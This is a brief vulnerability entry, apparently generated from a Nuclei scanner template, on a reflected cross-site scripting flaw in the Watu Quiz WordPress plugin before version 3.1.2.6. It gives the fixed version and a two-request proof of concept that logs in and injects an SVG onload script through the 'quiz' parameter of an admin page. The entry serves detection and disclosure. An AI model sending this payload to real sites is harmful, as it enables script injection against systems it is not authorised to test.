# Vulnerability: Watu Quiz < 3.1.2.6 - Cross Site Scripting
**Classification:** WATU
**Source:** Nuclei Template (`watu-xss.yaml`)

## Description
The Watu Quiz WordPress plugin was affected by a Reflected XSS via question-form.html.php security vulnerability.

## Secure Mitigation
Fixed in version 3.1.2.6

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

GET wp-admin/admin.php?page=watu_question&question=1&action=edit&quiz=1"><svg/onload=alert(document.domain)>  HTTP/1.1
Host: {{Hostname}}
```

